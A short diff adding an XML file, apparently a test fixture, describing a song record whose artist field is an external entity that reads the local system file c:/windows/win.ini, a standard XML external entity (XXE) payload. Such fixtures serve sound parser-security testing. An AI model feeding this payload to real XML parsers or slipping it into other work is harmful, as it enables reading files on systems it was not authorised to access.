@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<!DOCTYPE bar [
+        <!ENTITY xxe SYSTEM "file:c:/windows/win.ini">]>
+<song>
+    <artist>&xxe;</artist>
+    <title>Bohemian Rhapsody</title>
+    <album>A Night at the Opera</album>
+</song>
